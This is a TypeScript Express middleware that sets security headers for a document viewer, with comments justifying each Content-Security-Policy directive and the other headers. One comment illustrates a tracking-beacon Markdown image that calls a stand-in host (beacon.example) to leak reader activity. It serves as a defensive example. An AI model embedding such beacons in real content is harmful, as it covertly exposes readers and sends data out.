import type { NextFunction, Request, Response } from 'express';

// The headers every response carries (docs/12 §12.8a).
//
// Written out rather than taken from a package: there are six of them, each is a decision this
// project has to be able to explain, and two of them have to be built from configuration at boot.
//
// What is deliberately NOT here is a page `script-src`, nor the `connect-src` that belongs beside
// it. Ant Design's CSS-in-JS and Next's inline bootstrap both need either `'unsafe-inline'` — which
// would buy nothing while looking like it bought something — or a per-request nonce threaded
// through the Ant Design registry, which is a task of its own: **backlog M47.19**, written down at
// last, since the sentence promising it pointed at M15.7, which is closed (SEC-89). `connect-src`
// waits for the same task because it constrains only code that is already running. The `/api`
// surface gets the strict policy now, because nothing there has a reason to load anything at all.
const API_POLICY = [
  "default-src 'none'",
  "frame-ancestors 'none'",
  "base-uri 'none'",
  "form-action 'none'",
].join('; ');

// 🔒 For pages, the directives that cost nothing and do not wait for a nonce:
//
// - `frame-ancestors` closes clickjacking on a document viewer. `X-Frame-Options` goes with it for
//   anything that predates it.
// - `img-src` closes the read receipt. A document's Markdown is what the parser read off the pages,
//   and a page can say `![](https://beacon.example/p.png?d=payroll)`; rendered, it tells the person
//   who put the document there which readers opened it and from where, out of a deployment that is
//   often meant to have no way out at all (SEC-66). No script is needed for that, so no `script-src`
//   is needed to stop it.
// - `object-src` keeps the viewer's `<object>` embed of the canonical PDF and refuses every other
//   origin a plugin could be pointed at.
// - `base-uri` and `form-action` are free.
//
// The bucket has to be named in the two fetch directives: a preview `<img>` and the canonical
// `<object>` point at `/api/documents/:id/…`, which answers 302 to the browser-facing bucket origin,
// and a CSP is checked again against the host a redirect lands on. `data:` rides along for what the
// UI toolkit inlines. A bucket origin that does not parse leaves the app's own origin, which is the
// safe direction: a broken preview is visible, a silent hole is not.
function pagePolicy(bucketOrigin: string | null): string {
  const bucket = bucketOrigin === null ? '' : ` ${bucketOrigin}`;
  return [
    "frame-ancestors 'none'",
    "base-uri 'none'",
    "form-action 'self'",
    `img-src 'self' data:${bucket}`,
    `object-src 'self'${bucket}`,
  ].join('; ');
}

// A year, the value HSTS preload requires. Only ever sent over HTTPS: a browser ignores it on plain
// HTTP, but an instance served on `http://<lan-ip>` — which docs/08 §8.2 deliberately supports —
// must never be told to upgrade a scheme it does not have.
const HSTS = 'max-age=31536000; includeSubDomains';

const isApiPath = (path: string): boolean => path === '/api' || path.startsWith('/api/');

export function securityHeaders(options: {
  readonly usesHttps: boolean;
  readonly bucketOrigin: string | null;
}) {
  const pagePolicyHeader = pagePolicy(options.bucketOrigin);

  return (req: Request, res: Response, next: NextFunction): void => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    // No referrer at all, not the usual origin-only compromise: invite and reset links carry a
    // single-use credential in their path (docs/08 §8.1.2), and the day a page on this instance
    // loads something third-party, the browser default would send that path along with it.
    res.setHeader('Referrer-Policy', 'no-referrer');
    res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
    res.setHeader('Content-Security-Policy', isApiPath(req.path) ? API_POLICY : pagePolicyHeader);

    if (options.usesHttps) res.setHeader('Strict-Transport-Security', HSTS);

    next();
  };
}
